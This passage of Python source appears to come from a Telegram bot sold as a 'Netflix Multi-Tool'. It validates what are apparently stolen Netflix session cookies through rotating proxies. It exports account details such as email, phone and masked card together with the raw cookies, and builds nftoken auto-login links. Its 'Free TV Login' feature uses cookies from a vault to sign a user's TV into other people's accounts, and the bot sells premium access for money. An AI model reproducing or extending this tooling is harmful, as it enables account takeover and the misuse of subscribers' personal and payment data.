            expiry = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S UTC") if expires else "Unknown"
            return {'token': token, 'expires': expiry, 'expires_unix': expires}, None
        except Exception as e:
            if attempt < 2:
                time.sleep(random.uniform(0.5, 1.5))
                continue
            return None, str(e)[:80]

# ============================================================
# TV LOGIN
# ============================================================
def canonicalize_name(name):
    return CANONICAL_NAMES.get(str(name or "").strip().lower(), str(name or "").strip())

def is_netflix_cookie(domain, name):
    return canonicalize_name(name) in ALL_COOKIE_NAMES or "netflix." in str(domain or "").lower()

def extract_cookie_dict_tv(content):
    entries = {}
    for line in content.splitlines():
        line = line.strip()
        if not line: continue
        if line.startswith("#HttpOnly_"): line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) >= 7:
            name = canonicalize_name(parts[5])
            if is_netflix_cookie(parts[0], name): entries[name] = parts[6]
    if entries.get("NetflixId"): return entries
    try:
        data = json.loads(content)
        if isinstance(data, dict): data = data.get("cookies") or data.get("items") or [data]
        if isinstance(data, list):
            for c in data:
                if isinstance(c, dict):
                    name = canonicalize_name(c.get("name", ""))
                    if is_netflix_cookie(c.get("domain", ""), name):
                        entries[name] = str(c.get("value", ""))
    except Exception: pass
    if entries.get("NetflixId"): return entries
    for cn in ALL_COOKIE_NAMES:
        m = re.search(rf'{cn}\s*[:=]\s*([^\s;,\n"\']+)', content, re.IGNORECASE)
        if m: entries[cn] = m.group(1).strip('"\'')
    return entries if entries.get("NetflixId") else None

def validate_cookie_tv(cookies, proxy=None):
    s = requests.Session()
    s.cookies.update(cookies)
    try:
        r = s.get("https://www.netflix.com/YourAccount",
                  headers={"User-Agent": get_random_ua()}, proxies=proxy,
                  timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
        if 'login' in r.url.lower() or 'signin' in r.url.lower(): return False, None, None
        if r.status_code != 200: return False, None, None
        cm = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', r.text) or re.search(r'"currentCountry"\s*:\s*"([^"]+)"', r.text)
        pm = re.search(r'"localizedPlanName".*?"value":"([^"]+)"', r.text)
        country = cm.group(1) if cm else None
        plan = pm.group(1) if pm else "Unknown"
        return (('Account' in r.text or 'membershipStatus' in r.text) and country is not None), country, plan
    except Exception:
        return False, None, None

def extract_auth_url(html_text):
    for pat in [r'name="authURL"\s+value="([^"]+)"', r'authURL["\']?\s*[:=]\s*"([^"]+)"',
                r'authURL=([^&\s"\']+)', r'value="(c1\.[^"]+)"']:
        m = re.search(pat, html_text)
        if m: return urllib.parse.unquote(m.group(1))
    m = re.search(r'c1\.[a-zA-Z0-9%+=/_-]+', html_text)
    return m.group(0) if m else None

def submit_tv_code(session, tv_code, proxy=None):
    url = "https://www.netflix.com/tv8"
    headers = {"User-Agent": get_random_ua(), "Accept": "text/html",
               "Accept-Language": "en-US,en;q=0.9"}
    try:
        r = session.get(url, headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code != 200: return {"success": False, "error": f"HTTP {r.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)[:50]}
    auth_url = extract_auth_url(r.text)
    if not auth_url: return {"success": False, "error": "No auth URL"}
    form = {"flow": "websiteSignUp", "authURL": auth_url, "flowMode": "enterTvLoginRendezvousCode",
            "withFields": "tvLoginRendezvousCode,isTvUrl2", "code": tv_code,
            "tvLoginRendezvousCode": tv_code, "action": "nextAction"}
    try:
        r = session.post(url, data=form,
            headers={**headers, "Content-Type": "application/x-www-form-urlencoded",
                     "Referer": "https://www.netflix.com/tv8", "Origin": "https://www.netflix.com"},
            proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
    except Exception as e:
        return {"success": False, "error": str(e)[:50]}
    if "/tv/out/success" in r.url.lower(): return {"success": True, "error": None}
    txt = html_mod.unescape(re.sub(r'<[^>]+>', ' ', r.text)).lower()
    for pat in [r"your tv is ready", r"successfully activated", r"tv.*ready"]:
        if re.search(pat, txt): return {"success": True, "error": None}
    for pat in [r"that code wasn'?t right", r"code (is )?(incorrect|invalid|wrong|expired)", r"try again"]:
        if re.search(pat, txt): return {"success": False, "error": "Invalid or expired TV code"}
    return {"success": False, "error": "Unknown response"}

def get_vault_cookies():
    if not os.path.exists(COOKIES_DIR): return []
    return [f for f in os.listdir(COOKIES_DIR) if f.lower().endswith((".txt", ".json"))]

def count_vault_cookies():
    return len(get_vault_cookies())

def get_random_cookie_file():
    with cookie_lock:
        files = get_vault_cookies()
        if not files: return None, None
        for _ in range(min(5, len(files))):
            filename = random.choice(files)
            filepath = os.path.join(COOKIES_DIR, filename)
            try:
                if not os.path.exists(filepath): continue
                with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                os.remove(filepath)
                return filename, content
            except Exception: continue
        return None, None

def process_tv_login(tv_code, country_filter=None):
    max_attempts = min(100, max(count_vault_cookies() * 2, 50))
    attempts = 0
    tried = []
    while attempts < max_attempts:
        attempts += 1
        filename, content = get_random_cookie_file()
        if not filename: return {"success": False, "error": "no_cookies_left"}
        cookies = extract_cookie_dict_tv(content)
        if not cookies or not cookies.get('NetflixId'): continue
        proxy = get_rotating_proxy()
        valid, country, plan = validate_cookie_tv(cookies, proxy)
        if not valid: continue
        if country_filter and country and country.upper() not in [c.upper() for c in country_filter]:
            continue
        if country: tried.append(country)
        s = requests.Session()
        s.cookies.update(cookies)
        result = submit_tv_code(s, code_tv := tv_code, proxy)
        result.update({"country": country, "plan": plan, "cookie_file": filename, "tried_countries": tried})
        if result["success"]: return result
        if "Invalid" in str(result.get("error", "")): return result
    return {"success": False, "error": "all_cookies_failed", "tried_countries": tried}

# ============================================================
# HIT DB + STATS + SESSION + CLEANUP
# ============================================================
def save_hit_to_db(user_id, mode, data):
    try:
        db = load_json(HITS_DB_FILE, {})
        uid = str(user_id)
        db.setdefault(uid, []).append({
            "mode": mode, "timestamp": datetime.now().isoformat(),
            "country": data.get("country", "Unknown") if mode == "check" else "N/A",
            "plan": data.get("plan", "Unknown") if mode == "check" else "N/A",
            "email": data.get("email", "") if mode == "check" else "",
            "data": data
        })
        db[uid] = db[uid][-1000:]
        save_json(HITS_DB_FILE, db)
        if mode == "check":
            c = data.get("country", "Unknown")
            hit_stats["countries"][c] = hit_stats["countries"].get(c, 0) + 1
            hit_stats["total_hits"] = hit_stats.get("total_hits", 0) + 1
            save_json(STATS_FILE, hit_stats)
    except Exception as e:
        log.warning(f"Save hit: {e}")

def update_bonus_file():
    save_json(BONUS_FILE, daily_bonus_claimed)

def add_session(user_id, mode, total, hits):
    uid = str(user_id)
    session_history.setdefault(uid, []).append({
        "mode": mode, "total": total, "hits": hits,
        "time": datetime.now().isoformat()
    })
    session_history[uid] = session_history[uid][-50:]
    save_json(SESSION_FILE, session_history)

def cleanup_old_cookies(max_age_hours=48):
    if not os.path.exists(COOKIES_DIR): return 0
    now = time.time()
    deleted = 0
    for f in os.listdir(COOKIES_DIR):
        fp = os.path.join(COOKIES_DIR, f)
        if os.path.isfile(fp):
            age = (now - os.path.getmtime(fp)) / 3600
            if age > max_age_hours:
                try:
                    os.remove(fp); deleted += 1
                except Exception: pass
    return deleted

# ============================================================
# MESSAGES + MARKUP
# ============================================================
START_MSG = (
    "\n"
    " █ NETFLIX MULTI-TOOL BOT █\n\n"
    "[ Step 1 ] Choose mode below\n"
    "[ Step 2 ] Upload .txt/.json/.zip file\n"
    "[ Step 3 ] Get results\n\n"
)

def main_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 Check Account", callback_data="mode_check"),
         InlineKeyboardButton("🔑 Get NF Token", callback_data="mode_nftoken")],
        [InlineKeyboardButton("🧹 Clean Cookies", callback_data="mode_clean"),
         InlineKeyboardButton("📺 Free TV Login", callback_data="mode_tvlogin")],
        [InlineKeyboardButton("👤 Profile", callback_data="my_profile"),
         InlineKeyboardButton("🎁 Referral", callback_data="my_ref"),
         InlineKeyboardButton("🔥 Streak", callback_data="my_streak")],
        [InlineKeyboardButton("⭐ Watchlist", callback_data="my_watch"),
         InlineKeyboardButton("📜 History", callback_data="my_history")],
        [InlineKeyboardButton("🏆 Ref Leaderboard", callback_data="ref_lb")],
        [InlineKeyboardButton("💎 Premium", callback_data="premium_menu"),
         InlineKeyboardButton("🌐 Language", callback_data="lang_menu")],
        [InlineKeyboardButton("📊 My Stats", callback_data="my_stats"),
         InlineKeyboardButton("🔔 Notify", callback_data="toggle_notify")],
        [InlineKeyboardButton("🆘 Support", callback_data="support_menu"),
         InlineKeyboardButton("❓ Help", callback_data="help_menu")],
    ])

CHECK_MARKUP = InlineKeyboardMarkup([[InlineKeyboardButton("▶️ Start Checking", callback_data="start_check")]])
STOP_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🛑 Stop", callback_data="stop_check"),
     InlineKeyboardButton("📋 Get Hits", callback_data="get_hits")]
])
RESULT_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("📄 TXT", callback_data="result_txt"),
     InlineKeyboardButton("📦 ZIP", callback_data="result_zip"),
     InlineKeyboardButton("📊 CSV", callback_data="result_csv")],
    [InlineKeyboardButton("📄 PDF Report", callback_data="result_pdf"),
     InlineKeyboardButton("📋 JSON", callback_data="result_json")]
])

# ============================================================
# BUILD STRINGS
# ============================================================
def build_export_str(dd, idx):
    d = [f"========== HIT #{idx} =========="]
    for k, l in [('name', 'Name'), ('email', 'Email'), ('country', 'Country'), ('plan', 'Plan'),
                 ('plan_price', 'Price'), ('member_since', 'Member'), ('next_billing', 'Next Bill'),
                 ('payment_method', 'Payment'), ('masked_card', 'Card'), ('phone', 'Phone'),
                 ('phone_verified', 'Phone Ver'), ('email_verified', 'Email Ver'),
                 ('video_quality', 'Quality'), ('max_streams', 'Streams'), ('on_payment_hold', 'Hold'),
                 ('extra_member', 'Extra'), ('membership_status', 'Status'),
                 ('household', 'Household'), ('profiles', 'Profiles'), ('user_guid', 'GUID')]:
        d.append(f"{l}: {safe_html(dd.get(k, 'Unknown'))}")
    cd = dd.get('cookie', {})
    ns = dict_to_netscape(cd) if isinstance(cd, dict) else str(cd)
    return "\n".join(d) + "\n\nCookie:\n" + ns + f"\n\n{WATERMARK}"

def build_nftoken_str(dd, idx):
    ti = dd.get('token_info', {})
    t = ti.get('token', '')
    exp = ti.get('expires', 'N/A')
    if not t:
        return f"===== TOKEN #{idx} =====\n❌ No token\n\n{WATERMARK}"
    return (
        f"╔════════════════════════════════╗\n"
        f"║   🎬 NFT TOKEN #{idx}              \n"
        f"╚════════════════════════════════╝\n\n"
        f"🔑 <b>Token:</b>\n<code>{t}</code>\n\n"
        f"⏰ <b>Expires:</b> {exp}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📺 <b>TV Login:</b>\n"
        f"https://www.netflix.com/tv8?nftoken={t}\n\n"
        f"📱 <b>Mobile Login:</b>\n"
        f"https://www.netflix.com/unsupported?nftoken={t}\n\n"
        f"🖥️ <b>PC / Browser Login:</b>\n"
        f"https://www.netflix.com/browse?nftoken={t}\n\n"
        f"🌐 <b>Account Settings:</b>\n"
        f"https://www.netflix.com/YourAccount?nftoken={t}\n\n"
        f"🍿 <b>Direct Play:</b>\n"
        f"https://www.netflix.com/watch?nftoken={t}\n\n"
        f"📊 <b>Viewing Activity:</b>\n"
        f"https://www.netflix.com/viewingactivity?nftoken={t}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📝 <b>Instructions:</b>\n"
        f"1️⃣ লিংকে ক্লিক করুন\n"
        f"2️⃣ Netflix app/browser খুলবে\n"
        f"3️⃣ অটো login হবে\n"
        f"4️⃣ উপভোগ করুন! 🎉\n\n"
        f"<i>{WATERMARK}</i>"
    )

def build_nftoken_links_only(token, expires):
    return (
        f"🔑 Token: {token}\n"
        f"⏰ Expires: {expires}\n\n"
        f"📺 TV: https://www.netflix.com/tv8?nftoken={token}\n"
        f"📱 Mobile: https://www.netflix.com/unsupported?nftoken={token}\n"
        f"🖥️ PC: https://www.netflix.com/browse?nftoken={token}\n"
        f"🌐 Account: https://www.netflix.com/YourAccount?nftoken={token}\n"
        f"🍿 Play: https://www.netflix.com/watch?nftoken={token}\n"
        f"📊 Activity: https://www.netflix.com/viewingactivity?nftoken={token}\n\n"
        f"{WATERMARK}"
    )

# ============================================================
# START
# ============================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name

    if MAINTENANCE_MODE and user_id not in ADMIN_IDS:
        await update.message.reply_html(
            "🔧 <b>Bot under maintenance</b>\n\n"
            "Please try again later.\n"
            f"📢 Updates: @BlackoutZoneRBX404"
        )
        return

    joined, missing = await check_force_join(user_id, context)
    if not joined:
        await force_join_prompt(update, missing)
        return

    if context.args and context.args[0].startswith("ref_"):
        try:
            ref_id = context.args[0][4:]
            if ref_id != str(user_id) and ref_id.isdigit():
                ref_joined, _ = await check_force_join(int(ref_id), context)
                if ref_joined:
                    refs = referrals_data.setdefault(ref_id, {"count": 0, "referred": []})
                    if str(user_id) not in refs["referred"]:
                        refs["referred"].append(str(user_id))
                        refs["count"] += 1
                        save_json(REFERRAL_FILE, referrals_data)
                        update_ref_leaderboard(ref_id, refs["count"])
                        check_and_reward_vip(ref_id, refs["count"])
                        try:
                            await context.bot.send_message(
                                int(ref_id),
                                f"🎉 <b>New Referral!</b>\n\n"
                                f"👥 Total: <b>{refs['count']}</b>\n"
                                f"🎯 Next reward: <b>{((refs['count']//REFERRALS_TO_PREMIUM)+1) * REFERRALS_TO_PREMIUM}</b>",
                                parse_mode='HTML'
                            )
                        except Exception: pass
                else:
                    log.info(f"Referral blocked: {ref_id} not joined")
        except Exception as e:
            log.warning(f"Referral: {e}")

    register_user(user_id, username)
    async with user_locks[user_id]:
        if user_state.get(user_id, {}).get('busy'):
            await update.message.reply_html("⚠️ Already processing.", reply_markup=STOP_MARKUP)
            return
        user_state[user_id] = {'mode': 'check', 'cookies': [], 'stop': False, 'busy': False}

    if user_id in ADMIN_IDS: status = "👑 <b>Admin</b> - Unlimited"
    elif is_premium(user_id): status = f"💎 <b>Premium</b> - {str(get_premium_expiry(user_id))[:10]}"
    elif is_trial_active(user_id): status = f"🎁 <b>Trial</b> - {str(trial_users[str(user_id)]['expires'])[:10]}"
    elif user_id in banned_users: status = "🚫 <b>Banned</b>"
    else:
        _, _, rem = check_access(user_id)
        status = f"🆓 <b>Free</b> - {rem}/{FREE_DAILY_LIMIT} left"

    await update.message.reply_html(START_MSG + f"\n\n📊 Status: {status}", reply_markup=main_markup())

# ============================================================
# USER COMMANDS
# ============================================================
async def help_command(update, context):
    msg = (
        "📖 <b>Bot Commands</b>\n\n"
        "<b>🎯 User:</b>\n"
        "/start — Main menu\n"
        "/tv &lt;code&gt; — TV login\n"
        "/stop — Stop task\n"
        "/myplan — Your plan\n"
        "/profile — Your stats\n"
        "/refer — Referral link\n"
        "/reftop — Referral leaderboard\n"
        "/myhits — Hit history\n"
        "/search &lt;query&gt; — Search\n"
        "/filter US,UK — Country filter\n"
        "/filter off — Clear filter\n"
        "/lang — Change language\n"
        "/daily — Daily bonus\n"
        "/streak — Daily streak\n"
        "/watch — Add to watchlist\n"
        "/watchlist — View watchlist\n"
        "/notify — Toggle notifications\n"
        "/history — Session history\n"
        "/export — Export your data\n"
        "/test — Test single cookie\n"
        "/leaderboard — Top users\n"
        "/redeem &lt;code&gt; — Promo code\n"
        "/buy — Buy premium\n"
        "/uptime — Bot uptime\n"
        "/support &lt;msg&gt; — Contact admin\n"
        "/help — This menu\n\n"
        "<b>👑 Admin:</b>\n"
        "/admin — Admin panel\n"
        "/upload — Upload cookies\n"
        "/stats — Bot stats\n"
        "/globalstats — Analytics\n"
        "/addpremium &lt;id&gt; [days]\n"
        "/removepremium &lt;id&gt;\n"
        "/ban / /unban &lt;id&gt;\n"
        "/broadcast &lt;msg&gt;\n"
        "/vault — Cookie count\n"
        "/addchannel / /removechannel\n"
        "/channels — List channels\n"
        "/addpromo &lt;code&gt; &lt;days&gt; [uses]\n"
        "/delpromo &lt;code&gt; / /listpromo\n"
        "/audit — Admin log\n"
        "/tickets — Support tickets\n"
        "/impersonate &lt;id&gt;\n"
        "/maintenance — Toggle mode\n"
        "/proxycheck — Test proxies\n"
        "/cleanup — Clean old cookies\n\n"
        f"{WATERMARK}"
    )
    await update.message.reply_html(msg, disable_web_page_preview=True)

async def stop_command(update, context):
    uid = update.effective_user.id
    async with user_locks[uid]:
        if uid in user_tasks:
            user_tasks[uid].cancel()
        if uid in user_state:
            user_state[uid]['busy'] = False
            user_state[uid]['stop'] = True
    await update.message.reply_text("🛑 Stopped!")

async def myplan_command(update, context):
    uid = update.effective_user.id
    if uid in ADMIN_IDS:
        await update.message.reply_html("👑 <b>Admin</b> - Unlimited"); return
    if is_premium(uid):
        exp = get_premium_expiry(uid)
        try: days = (parse_iso(exp) - datetime.now()).days
        except Exception: days = "?"
        tier = premium_data.get(str(uid), {}).get("tier", "Basic")
        await update.message.reply_html(f"💎 <b>Premium ({tier})</b>\nExpires: <code>{str(exp)[:19]}</code>\nDays left: <b>{days}</b>")
        return
    if is_trial_active(uid):
        exp = trial_users[str(uid)]["expires"]
        await update.message.reply_html(f"🎁 <b>Trial</b>\nExpires: <code>{str(exp)[:19]}</code>")
        return
    _, _, rem = check_access(uid)
    await update.message.reply_html(
        f"🆓 <b>Free User</b>\n\nLimit: <b>{FREE_DAILY_LIMIT}</b>\n"
        f"Used: <b>{user_daily_usage[uid]['count']}</b>\nRemaining: <b>{rem}</b>\n\n💎 Buy: /buy")

async def profile_command(update, context):
    uid = update.effective_user.id
    uid_s = str(uid)
    udata = users_data.get(uid_s, {})
    db = load_json(HITS_DB_FILE, {})
    my_hits = db.get(uid_s, [])
    refs = referrals_data.get(uid_s, {}).get('count', 0)
    if uid in ADMIN_IDS: plan = "👑 Admin"
    elif is_premium(uid): plan = "💎 Premium"
    elif is_trial_active(uid): plan = "🎁 Trial"
    else: plan = "🆓 Free"
    msg = (f"👤 <b>Your Profile</b>\n\n"
           f"🆔 ID: <code>{uid}</code>\n"
           f"📛 Name: {safe_html(update.effective_user.first_name or 'Unknown')}\n"
           f"🎯 Plan: {plan}\n\n"
           f"📊 <b>Stats</b>\n"
           f"🎬 Checks: <b>{udata.get('total_checks', 0)}</b>\n"
           f"💎 Hits: <b>{len(my_hits)}</b>\n"
           f"👥 Referrals: <b>{refs}</b>\n"
           f"🔥 Streak: <b>{user_streaks.get(uid_s, {}).get('streak', 0)}</b>\n"
           f"📅 Joined: {str(udata.get('joined', 'Unknown'))[:10]}")
    await update.message.reply_html(msg)

async def refer_command(update, context):
    uid = str(update.effective_user.id)
    bot_un = (await context.bot.get_me()).username
    link = f"https://t.me/{bot_un}?start=ref_{uid}"
    cnt = referrals_data.get(uid, {}).get('count', 0)
    needed = REFERRALS_TO_PREMIUM - (cnt % REFERRALS_TO_PREMIUM)
    await update.message.reply_html(
        f"🎁 <b>Your Referral Link</b>\n\n<code>{link}</code>\n\n"
        f"👥 Referrals: <b>{cnt}</b>\n"
        f"🎯 Need <b>{needed}</b> more for {REFERRAL_PREMIUM_DAYS} days\n\n"
        f"⭐ <b>VIP Tiers:</b>\n"
        f"🥉 Bronze: 5 refs → 7 days\n"
        f"🥈 Silver: 15 refs → 30 days\n"
        f"🥇 Gold: 30 refs → 60 days\n"
        f"💎 Platinum: 50 refs → 120 days",
        disable_web_page_preview=True)

async def myhits_command(update, context):
    uid = str(update.effective_user.id)
    db = load_json(HITS_DB_FILE, {})
    my = db.get(uid, [])
    if not my:
        await update.message.reply_text("📭 No hits yet!"); return
    recent = my[-20:]
    txt = f"📊 Last {len(recent)} of {len(my)} hits:\n\n"
    for h in recent:
        txt += f"[{h['timestamp'][:10]}] {h['mode']} | {h.get('country','')} | {h.get('plan','')}\n"
    await update.message.reply_text(txt[:4000])

async def search_command(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /search <email or country>"); return
    q = context.args[0].lower()
    uid = str(update.effective_user.id)
    db = load_json(HITS_DB_FILE, {})
    matches = [h for h in db.get(uid, [])
               if q in str(h.get('email', '')).lower() or q in str(h.get('country', '')).lower()]
    if not matches:
        await update.message.reply_text(f"No matches for '{q}'"); return
    txt = "\n\n".join([build_export_str(m['data'], i+1) for i, m in enumerate(matches[:20])])
    buf = io.BytesIO(txt.encode())
    await update.message.reply_document(InputFile(buf, filename=f"search_{safe_filename(q)}.txt"),
                                        caption=f"Found {len(matches)} matches")

async def filter_command(update, context):
    uid = update.effective_user.id
    if not context.args:
        cf = user_state.get(uid, {}).get('country_filter', [])
        await update.message.reply_html(
            f"🌍 Current: <b>{', '.join(cf) if cf else 'None'}</b>\n\n"
            f"<code>/filter US,UK,CA</code>\n<code>/filter off</code>"); return
    arg = " ".join(context.args)
    if arg.lower() in ('off', 'none', 'clear'):
        user_state.setdefault(uid, {})['country_filter'] = None
        await update.message.reply_text("✅ Filter cleared!"); return
    cs = [c.strip().upper() for c in arg.split(',') if c.strip()]
    user_state.setdefault(uid, {})['country_filter'] = cs
    await update.message.reply_html(f"✅ Filter: <b>{', '.join(cs)}</b>")

async def lang_command(update, context):
    uid = update.effective_user.id
    cur = user_lang.get(uid, 'en')
    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("🇬🇧 English", callback_data="setlang_en"),
         InlineKeyboardButton("🇧🇩 বাংলা", callback_data="setlang_bn")]])
    await update.message.reply_html(f"🌐 Current: <b>{'English' if cur == 'en' else 'বাংলা'}</b>",
                                    reply_markup=markup)

async def setlang_callback(update, context):
    q = update.callback_query
    lang = q.data.replace("setlang_", "")
    user_lang[q.from_user.id] = lang
    await q.answer(f"✅ {lang}")
    try:
        await q.message.edit_text(f"🌐 Language set: {'English' if lang == 'en' else 'বাংলা'}")
    except Exception: pass

async def daily_command(update, context):
    uid = update.effective_user.id
    if is_premium(uid) or uid in ADMIN_IDS:
        await update.message.reply_text("💎 Already premium!"); return
    today = datetime.now().strftime("%Y-%m-%d")
    if daily_bonus_claimed.get(str(uid)) == today:
        await update.message.reply_text("⏰ Already claimed!"); return
    user_daily_usage[uid]["count"] = max(0, user_daily_usage[uid]["count"] - DAILY_BONUS_CREDITS)
    daily_bonus_claimed[str(uid)] = today
    update_bonus_file()
    await update.message.reply_html(f"🎁 <b>+{DAILY_BONUS_CREDITS} free checks!</b>")

async def streak_command(update, context):
    uid = str(update.effective_user.id)
    today = datetime.now().strftime("%Y-%m-%d")
    data = user_streaks.get(uid, {"streak": 0, "last": None, "total": 0})

    if data.get("last") == today:
        await update.message.reply_html(
            f"🔥 <b>Current Streak:</b> {data['streak']} days\n"
            f"📅 Total visits: {data['total']}\n\n"
            f"<i>Already counted today!</i>")
        return

    yesterday = (datetime.now() - timedelta(days=1)).strftime("%Y-%m-%d")
    if data.get("last") == yesterday:
        data["streak"] += 1
    else:
        data["streak"] = 1
    data["last"] = today
    data["total"] = data.get("total", 0) + 1
    user_streaks[uid] = data
    save_json(STREAK_FILE, user_streaks)

    if data["streak"] % 7 == 0:
        user_daily_usage[int(uid)]["count"] = max(0, user_daily_usage[int(uid)]["count"] - 5)
        reward = "🎁 +5 bonus checks!"
    elif data["streak"] % 3 == 0:
        user_daily_usage[int(uid)]["count"] = max(0, user_daily_usage[int(uid)]["count"] - 2)
        reward = "🎁 +2 bonus checks!"
    else:
        reward = "Keep going! 🔥"

    await update.message.reply_html(
        f"🔥 <b>Streak Updated!</b>\n\n"
        f"📅 Current: <b>{data['streak']} days</b>\n"
        f"🏆 Total: <b>{data['total']}</b>\n\n{reward}")

async def watch_command(update, context):
    uid = str(update.effective_user.id)
    if not update.message.reply_to_message:
        await update.message.reply_text("📎 Reply to a message with /watch"); return
    text = update.message.reply_to_message.text or ""
    if not text:
        await update.message.reply_text("❌ No text in message"); return
    watchlist_data.setdefault(uid, []).append(text[:500])
    watchlist_data[uid] = watchlist_data[uid][-100:]
    save_json(WATCHLIST_FILE, watchlist_data)
    await update.message.reply_text("⭐ Added to watchlist!")

async def watchlist_command(update, context):
    uid = str(update.effective_user.id)
    my_watch = watchlist_data.get(uid, [])
    if not my_watch:
        await update.message.reply_html(
            "⭐ <b>Watchlist Empty</b>\n\nReply to a bot message with <code>/watch</code>")
        return
    txt = f"⭐ <b>Your Watchlist ({len(my_watch)})</b>\n\n"
    for i, item in enumerate(my_watch[-10:], 1):
        txt += f"{i}. {safe_html(str(item)[:80])}\n"
    await update.message.reply_html(txt)

async def notify_command(update, context):
    uid = str(update.effective_user.id)
    current = notify_settings.get(uid, True)
    notify_settings[uid] = not current
    save_json(NOTIFY_FILE, notify_settings)
    status = "🔔 ON" if notify_settings[uid] else "🔕 OFF"
    await update.message.reply_html(f"Notifications: <b>{status}</b>")

async def history_command(update, context):
    uid = str(update.effective_user.id)
    hist = session_history.get(uid, [])
    if not hist:
        await update.message.reply_text("📭 No history!"); return
    txt = "📜 <b>Recent Sessions</b>\n\n"
    for h in hist[-10:]:
        txt += f"[{h['time'][:16]}] {h['mode']} | {h['total']} → 💎 {h['hits']}\n"
    await update.message.reply_html(txt)

async def export_command(update, context):
    uid = str(update.effective_user.id)
    data = {
        "user_id": uid,
        "profile": users_data.get(uid, {}),
        "premium": premium_data.get(uid, {}),
        "referrals": referrals_data.get(uid, {}),
        "hits_count": len(load_json(HITS_DB_FILE, {}).get(uid, [])),
        "sessions": session_history.get(uid, []),
        "streak": user_streaks.get(uid, {}),
        "watchlist": watchlist_data.get(uid, []),
        "exported_at": datetime.now().isoformat(),
    }
    buf = io.BytesIO(json.dumps(data, indent=2, default=str).encode())
    await update.message.reply_document(
        InputFile(buf, filename=f"my_data_{uid}.json"),
        caption=f"📦 Your data export\n{WATERMARK}")

async def test_command(update, context):
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("📎 Reply to a cookie file with /test"); return
    doc = update.message.reply_to_message.document
    if doc.file_size > 1024 * 100:
        await update.message.reply_text("❌ File too big"); return
    msg = await update.message.reply_text("🔍 Testing...")
    try:
        f = await context.bot.get_file(doc.file_id)
        content = (await f.download_as_bytearray()).decode('utf-8', errors='ignore')
        cookies = parse_cookie_file(content)
        if not cookies:
            await msg.edit_text("❌ No cookies found"); return
        _, ck = cookies[0]
        result = await asyncio.to_thread(check_netflix_cookie, ck)
        if result.get('ok') and result.get('premium'):
            txt = (f"✅ <b>LIVE COOKIE!</b>\n\n"
                   f"👤 {scrub_text(clean_unicode(result.get('name', 'Unknown')))}\n"
                   f"🌍 {result.get('country', 'Unknown')}\n"
                   f"📦 {result.get('plan', 'Unknown')}\n"
                   f"📧 {scrub_text(clean_unicode(result.get('email', 'Unknown')))}\n"
                   f"📺 {result.get('video_quality', 'Unknown')}")
        else:
            txt = f"❌ Dead or Free\n{result.get('reason', 'Unknown')}"
        await msg.edit_text(txt, parse_mode='HTML')
    except Exception as e:
        await msg.edit_text(f"❌ {e}")

async def ref_leaderboard_command(update, context):
    lb = load_json(REF_LEADERBOARD_FILE, {})
    if not lb:
        await update.message.reply_text("No referrals yet!"); return
    sorted_lb = sorted(lb.items(), key=lambda x: x[1], reverse=True)[:10]
    txt = "🏆 <b>Top Referrers</b>\n\n"
    medals = ["🥇", "🥈", "🥉"]
    for i, (uid, cnt) in enumerate(sorted_lb, 1):
        m = medals[i-1] if i <= 3 else f"{i}."
        txt += f"{m} <code>{uid}</code> — <b>{cnt}</b> refs\n"
    await update.message.reply_html(txt)

async def leaderboard_command(update, context):
    db = load_json(HITS_DB_FILE, {})
    scores = sorted([(uid, len(h)) for uid, h in db.items()], key=lambda x: x[1], reverse=True)
    if not scores:
        await update.message.reply_text("No data!"); return
    txt = "🏆 <b>Leaderboard</b>\n\n"
    medals = ["🥇", "🥈", "🥉"]
    for i, (uid, cnt) in enumerate(scores[:10], 1):
        m = medals[i-1] if i <= 3 else f"{i}."
        txt += f"{m} <code>{uid}</code> — <b>{cnt}</b> hits\n"
    await update.message.reply_html(txt)

async def uptime_command(update, context):
    uptime = time.time() - bot_start_time
    days = int(uptime // 86400); hours = int((uptime % 86400) // 3600); mins = int((uptime % 3600) // 60)
    await update.message.reply_html(
        f"⏰ <b>Uptime</b>\n\n{days}d {hours}h {mins}m\n"
        f"👥 Users: <b>{len(users_data)}</b>\n"
        f"🍪 Vault: <b>{count_vault_cookies()}</b>\n"
        f"⚡ Workers: <b>{MAX_WORKERS}</b>")

async def buy_command(update, context):
    msg = (f"💎 <b>Buy Premium</b>\n\n<b>Plans:</b>\n"
           f"• 7 days — 50৳\n• 30 days — 150৳\n• 90 days — 400৳\n\n"
           f"<b>Payment:</b>\n📱 bKash: <code>{PAYMENT_INFO.get('bkash','N/A')}</code>\n"
           f"📱 Nagad: <code>{PAYMENT_INFO.get('nagad','N/A')}</code>\n\n"
           f"<b>How:</b>\n1. Send money\n2. Send TrxID to admin\n3. Get premium\n\n"
           f"📞 Contact: {WATERMARK}")
    await update.message.reply_html(msg)

async def redeem_command(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /redeem <code>"); return
    code = context.args[0].upper()
    uid = str(update.effective_user.id)
    if code not in promo_codes:
        await update.message.reply_text("❌ Invalid code!"); return
    promo = promo_codes[code]
    if promo.get("uses", 0) >= promo.get("max_uses", 999999):
        await update.message.reply_text("❌ Used up!"); return
    if uid in promo.get("used_by", []):
        await update.message.reply_text("❌ Already used!"); return
    days = promo.get("days", 7)
    current = premium_data.get(uid, {}).get("expires")
    base = datetime.now()
    if current:
        try:
            ce = parse_iso(current)
            if ce and ce > base: base = ce
        except Exception: pass
    new_exp = (base + timedelta(days=days)).isoformat()
    premium_data[uid] = {"expires": new_exp}
